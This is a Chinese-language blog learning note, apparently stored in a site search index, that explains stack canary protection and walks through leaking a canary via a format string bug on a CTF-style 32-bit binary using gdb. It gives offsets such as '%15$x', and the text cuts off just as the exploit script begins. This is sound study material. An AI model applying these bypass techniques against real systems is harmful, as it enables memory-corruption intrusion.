<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>canary保护机制以及解决方法</title>
    <link href="/2025/02/25/canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2025/02/25/canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="canary保护机制以及解决方法"><a href="#canary保护机制以及解决方法" class="headerlink" title="canary保护机制以及解决方法"></a>canary保护机制以及解决方法</h1><p>学习参考：<a href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="该词的来源"><a href="#该词的来源" class="headerlink" title="该词的来源"></a>该词的来源</h3><p>Canary原意为“金丝雀”，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p><h3 id="安全方面的运用"><a href="#安全方面的运用" class="headerlink" title="安全方面的运用"></a>安全方面的运用</h3><p>由上文我们就可以大概才出来，它可以对某种有害操作进行预警，从而终止程序的运行。具体来说，Canary这种保护机制主要针对的是栈溢出漏洞。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>当启用Canary保护后，它会在栈底之前（不一定紧挨着栈底）插入一个<code>Canary值</code>，一般是是一个随机生成的数字，32位是4字节，64位是8字节。在栈内存中，函数调用时会创建栈帧。栈帧包含了局部变量，返回地址等信息，同时包括Canary值，它被放在栈帧中靠近返回地址和局部变量的位置。在程序正常运行时，Canary值不会改变，但如果发生栈溢出，Canary值可能会改变，程序在关键操作（如函数返回）之前会检查Canary值是否被修改，一旦发现被修改，就会采取安全措施，如终止程序。</p><h3 id="在GCC中使用Canary"><a href="#在GCC中使用Canary" class="headerlink" title="在GCC中使用Canary"></a>在GCC中使用Canary</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-strong</span><br><span class="hljs-deletion">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="hljs-deletion">-fno-stack-protector 禁用保护</span><br></code></pre></td></tr></table></figure><hr><p>这些内容过于专业，以我现在的水平看不太懂，先写上，留给以后看</p><h3 id="Canary保护栈的原理"><a href="#Canary保护栈的原理" class="headerlink" title="Canary保护栈的原理"></a>Canary保护栈的原理</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">高地址          |<span class="hljs-string">  </span>|<br>+-------------------+<br>|<span class="hljs-string">参数   </span>|<br>+-------------------+<br>|<span class="hljs-string">返回地址  </span>|<br>+-------------------+<br>  rbp--&gt;|<span class="hljs-string">旧的rbp   </span>|<br>+-------------------+<br>rbp-8--&gt;|<span class="hljs-string">Canary 值    </span>|<br>+-------------------+<br>|<span class="hljs-string">局部变量  </span>|<br>低地址  +-------------------+<br></code></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x4 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">这是对两个陌生名词的解释：<br><br>函数序言：是指是函数在被调用时，首先执行的一段指令序列。它主要用于函数调用的初始化工作，是编译器在生成目标代码时插入到函数开头的部分。主要任务有保存寄存器状态，分配栈空间，设置栈帧指针<br><br><span class="hljs-built_in">fs</span>寄存器：是x86架构下的一个段寄存器，S 寄存器常与通用寄存器如 <span class="hljs-built_in">EAX</span>、<span class="hljs-built_in">EBX</span> 等配合使用，来实现对特定内存位置的数据访问和操作。<br></code></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这也意味着可以通过劫持__stack_chk_fail 的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br> 事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><hr><h2 id="绕过Canary保护"><a href="#绕过Canary保护" class="headerlink" title="绕过Canary保护"></a>绕过Canary保护</h2><p>学习参考：<a href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p><p>​                    <a href="https://www.yuque.com/cyberangel/rg9gdm/kukf7u">https://www.yuque.com/cyberangel/rg9gdm/kukf7u</a></p><hr><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用</p><h3 id="泄露栈中的Canary"><a href="#泄露栈中的Canary" class="headerlink" title="泄露栈中的Canary"></a>泄露栈中的Canary</h3><p>Canary值设计以<code>\x00</code>结尾（在最低位），本意是为了保证Canary可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><p>我们接下来用一个实例来演示</p><p>先来查一下保护，32位，开启了NX和Canary保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./binary_200<br>44<br>44<br></code></pre></td></tr></table></figure><p>我们注意一下<code>main</code>函数的开头和结尾的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------开头的一部分------------------------+<br>.text:08048561                 push    ebp<br>.text:08048562                 mov     ebp, esp<br>.text:08048564                 and     esp, 0FFFFFFF0h<br>.text:08048567                 sub     esp, 40h<br>.text:0804856A                 mov     eax, large gs:14h   &lt;--<br>.text:08048570                 mov     [esp+3Ch], eax<br>+--------------------结尾的一部分-------------------------+<br>.text:080485E9                 mov     edx, [esp+3Ch]<br>.text:080485ED                 xor     edx, large gs:14h   &lt;--<br>.text:080485F4                 jz      short locret_80485FB<br>.text:080485F6                 call    ___stack_chk_fail<br></code></pre></td></tr></table></figure><p>这些汇编命令的出现也印证开启了Canary保护（真是一句废话），gs和fs都是x86的段寄存器，都可以这样用</p><p>看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(s);&lt;--<br>  gets(s);&lt;--<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现了格式化字符串漏洞，这意味着我们可以泄露栈上的数据，不光有这个，还有危险函数<code>gets</code></p><p>同时，我们也发现了完整的后门函数<code>system（&#39;/bin/sh&#39;)</code></p><p>这样我们就有了一个大概的思路：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">待补充<br></code></pre></td></tr></table></figure><p>首先，我我们需要找出Canary相对于格式化字符串的偏移，并打印出Canary的值</p><p>这是用gdb动调找Canay值的方法</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">───────────────────────────[ STACK ]─────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">esp</span> <span class="hljs-number">0xffffd11c</span> —▸ <span class="hljs-number">0x80485d8</span> (main+<span class="hljs-number">119</span>) ◂— <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span> + <span class="hljs-number">0x14</span>]<br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">048</span> <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-string">&#x27;aaaa&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">044</span> <span class="hljs-number">0xffffd124</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">03</span>:000c│-<span class="hljs-number">040</span> <span class="hljs-number">0xffffd128</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│-03c <span class="hljs-number">0xffffd12c</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│-<span class="hljs-number">038</span> <span class="hljs-number">0xffffd130</span> —▸ <span class="hljs-number">0xf7fbe4a0</span> —▸ <span class="hljs-number">0xf7d77000</span> ◂— <span class="hljs-number">0x464c457f</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│ <span class="hljs-built_in">eax</span> <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-string">&#x27;aaaa&#x27;</span><br><span class="hljs-number">07</span>:001c│-<span class="hljs-number">030</span> <span class="hljs-number">0xffffd138</span> —▸ <span class="hljs-number">0xf7d8f400</span> ◂— <span class="hljs-number">0x74656700</span><br></code></pre></td></tr></table></figure><p>使用<code>x/20wx 0xffffd120</code>命令打印内存中的值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>wx <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">0xffffd120</span>:<span class="hljs-number">0</span>xffffd134<span class="hljs-number">0</span>x00000000<span class="hljs-number">0</span>x00000001<span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0xffffd130</span>:<span class="hljs-number">0</span>xf7fbe4a0<span class="hljs-number">0</span>x61616161<span class="hljs-number">0</span>xf7d8f400<span class="hljs-number">0</span>xf7fbe4a0<br><span class="hljs-attribute">0xffffd140</span>:<span class="hljs-number">0</span>xffffd180<span class="hljs-number">0</span>xf7fbe66c<span class="hljs-number">0</span>xf7fbeb10<span class="hljs-number">0</span>x00000001<br><span class="hljs-attribute">0xffffd150</span>:<span class="hljs-number">0</span>x00000001<span class="hljs-number">0</span>x00000000<span class="hljs-number">0</span>xf7fa1000<span class="hljs-number">0</span>x2b539700<br><span class="hljs-attribute">0xffffd160</span>:<span class="hljs-number">0</span>xffffd3eb<span class="hljs-number">0</span>x00000070<span class="hljs-number">0</span>xf7ffd020<span class="hljs-number">0</span>xf7d98519<br></code></pre></td></tr></table></figure><p>其中<code>0xffffd134</code>是个储存格式化字符串内存的地址，从这个之后开始数，发现<code>0x61616161</code>是第五个，所以我们确定格式化字符串的偏移量为5</p><p>然后我们在<code>xor</code>处下断点，因为启用Canary保护之后，汇编代码中一个函数的开头和结尾都会出现<code>xor</code>即异或操作，所以在这里下断点。因为<code>xor</code>是汇编命令，不是函数，所以我们需要知道它的地址，在gdb中，先使用<code>finish</code>步出<code>printf</code>函数（下断点后运行，中断时一般自动步入该函数），再使用<code>disassemble</code>命令显示反汇编，查看其地址。或者使用<code>finish</code>步出后，看看反汇编窗口有没有<code>xor</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  0x80485d8 &lt;main+119&gt;    lea    eax, [esp + 0x14]        EAX =&gt; 0xffffd134 ◂— &#x27;aaaa&#x27;<br>  0x80485dc &lt;main+123&gt;    mov    dword ptr [esp], eax     [0xffffd120] &lt;= 0xffffd134 ◂— &#x27;aaaa&#x27;<br>  0x80485df &lt;main+126&gt;    call   gets@plt                    &lt;gets@plt&gt;<br><br>  0x80485e4 &lt;main+131&gt;    mov    eax, 0                          EAX =&gt; 0<br>  0x80485e9 &lt;main+136&gt;    mov    edx, dword ptr [esp + 0x3c]<br>► 0x80485ed &lt;main+140&gt;    xor    edx, dword ptr gs:[0x14]        EDX =&gt; 0x2b539700 ^ 0x2b539700<br>  0x80485f4 &lt;main+147&gt;    je     main+154                    &lt;main+154&gt;<br><br>  0x80485f6 &lt;main+149&gt;    call   __stack_chk_fail@plt        &lt;__stack_chk_fail@plt&gt;<br><br>  0x80485fb &lt;main+154&gt;    leave  <br>  0x80485fc &lt;main+155&gt;    ret    <br><br>  0x80485fd               nop    <br></code></pre></td></tr></table></figure><p>我们可以看到，Canary的值储存在了edx寄存器中，因为再函数开头的Canary保护相应汇编指令中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0804856A                 mov     eax, large gs:14h   &lt;--<br>.text:08048570                 mov     [esp+3Ch], eax&lt;--<br></code></pre></td></tr></table></figure><p>我们得知<code>[esp+3Ch]</code>是存放Canary的随即参数</p><p>我们查看寄存器的值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eax</span>            <span class="hljs-number">0</span>x0                 <span class="hljs-number">0</span><br><span class="hljs-attribute">ecx</span>            <span class="hljs-number">0</span>xf7fa29c0          -<span class="hljs-number">134600256</span><br><span class="hljs-attribute">edx</span>            <span class="hljs-number">0</span>x2b539700          <span class="hljs-number">726898432</span><br><span class="hljs-attribute">ebx</span>            <span class="hljs-number">0</span>xf7fa1000          -<span class="hljs-number">134606848</span><br><span class="hljs-attribute">esp</span>            <span class="hljs-number">0</span>xffffd120          <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">ebp</span>            <span class="hljs-number">0</span>xffffd168          <span class="hljs-number">0</span>xffffd168<br><span class="hljs-attribute">esi</span>            <span class="hljs-number">0</span>xffffd224          -<span class="hljs-number">11740</span><br><span class="hljs-attribute">edi</span>            <span class="hljs-number">0</span>xf7ffcb80          -<span class="hljs-number">134231168</span><br><span class="hljs-attribute">eip</span>            <span class="hljs-number">0</span>x80485ed           <span class="hljs-number">0</span>x80485ed &lt;main+<span class="hljs-number">140</span>&gt;<br><span class="hljs-attribute">eflags</span>         <span class="hljs-number">0</span>x246              <span class="hljs-meta"> [ PF ZF IF ]</span><br><span class="hljs-attribute">cs</span>             <span class="hljs-number">0</span>x23                <span class="hljs-number">35</span><br><span class="hljs-attribute">ss</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">ds</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">es</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">fs</span>             <span class="hljs-number">0</span>x0                 <span class="hljs-number">0</span><br><span class="hljs-attribute">gs</span>             <span class="hljs-number">0</span>x63                <span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><p>然后再结合上面打印出来的内存</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>wx <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">0xffffd120</span>:<span class="hljs-number">0</span>xffffd134<span class="hljs-number">0</span>x00000000<span class="hljs-number">0</span>x00000001<span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0xffffd130</span>:<span class="hljs-number">0</span>xf7fbe4a0<span class="hljs-number">0</span>x61616161<span class="hljs-number">0</span>xf7d8f400<span class="hljs-number">0</span>xf7fbe4a0<br><span class="hljs-attribute">0xffffd140</span>:<span class="hljs-number">0</span>xffffd180<span class="hljs-number">0</span>xf7fbe66c<span class="hljs-number">0</span>xf7fbeb10<span class="hljs-number">0</span>x00000001<br><span class="hljs-attribute">0xffffd150</span>:<span class="hljs-number">0</span>x00000001<span class="hljs-number">0</span>x00000000<span class="hljs-number">0</span>xf7fa1000<span class="hljs-number">0</span>x2b539700 &lt;--<br><span class="hljs-attribute">0xffffd160</span>:<span class="hljs-number">0</span>xffffd3eb<span class="hljs-number">0</span>x00000070<span class="hljs-number">0</span>xf7ffd020<span class="hljs-number">0</span>xf7d98519<br></code></pre></td></tr></table></figure><p>我们可以得知，Canary的偏移为15，所以我们只需要再第一次<code>get</code>时发送<code>%15$x</code>就会泄露出Canary的值</p><p>然后我们开始确定第一次的<code>gets</code>到Canary的偏移，同时，我们知道<code>v5</code>是用来储存Canary值的（为什么，看伪代码注释），打开IDA，查看栈</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000040 // Use data definition commands to manipulate stack variables and arguments.</span><br><span class="hljs-deletion">-0000000000000040 // Frame size: 40; Saved regs: 4; Purge: 0</span><br><span class="hljs-deletion">-0000000000000040</span><br>……<br><span class="hljs-deletion">-000000000000002C     char s;&lt;--</span><br>……<br><span class="hljs-deletion">-0000000000000004     _DWORD var_4;&lt;--</span><br><span class="hljs-addition">+0000000000000000     _DWORD __saved_registers;</span><br><span class="hljs-addition">+0000000000000004     _UNKNOWN *__return_address;</span><br><span class="hljs-addition">+0000000000000008     int argc;</span><br><span class="hljs-addition">+000000000000000C     const char **argv;</span><br><span class="hljs-addition">+0000000000000010     const char **envp;</span><br><span class="hljs-addition">+0000000000000014</span><br></code></pre></td></tr></table></figure><p>二者距离EBP的距离相减即为数组s到Canary的距离，为40字节</p><p>然后确定Canary到EBP的偏移，用上面在<code>xor</code>下断点后的gdb调试页面</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">*<span class="hljs-built_in">EAX</span>  <span class="hljs-number">0</span><br> <span class="hljs-built_in">EBX</span>  <span class="hljs-number">0xf7fa1000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-number">0x229dac</span><br>*<span class="hljs-built_in">ECX</span>  <span class="hljs-number">0xf7fa29c0</span> (_IO_stdfile_0_lock) ◂— <span class="hljs-number">0</span><br>*<span class="hljs-built_in">EDX</span>  <span class="hljs-number">0x2b539700</span><br> <span class="hljs-built_in">EDI</span>  <span class="hljs-number">0xf7ffcb80</span> (_rtld_global_ro) ◂— <span class="hljs-number">0</span><br> <span class="hljs-built_in">ESI</span>  <span class="hljs-number">0xffffd224</span> —▸ <span class="hljs-number">0xffffd3eb</span> ◂— <span class="hljs-string">&#x27;/home/xyq/test/binary_200&#x27;</span><br> <span class="hljs-built_in">EBP</span>  <span class="hljs-number">0xffffd168</span> —▸ <span class="hljs-number">0xf7ffd020</span> (_rtld_global) —▸ <span class="hljs-number">0xf7ffda40</span> ◂— <span class="hljs-number">0</span><br> <span class="hljs-built_in">ESP</span>  <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-number">0x61616100</span><br>*<span class="hljs-built_in">EIP</span>  <span class="hljs-number">0x80485ed</span> (main+<span class="hljs-number">140</span>) ◂— <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">gs</span>:[<span class="hljs-number">0x14</span>]<br></code></pre></td></tr></table></figure><p>这里已经有了ESP，EBP的地址，我们就可以算出v5 &#x3D; ESP + 0x3C &#x3D; 0xffffD15C，v5距离EBP的偏移量为EBP-v5为12字节</p><p>接下来，我们就可以构建EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 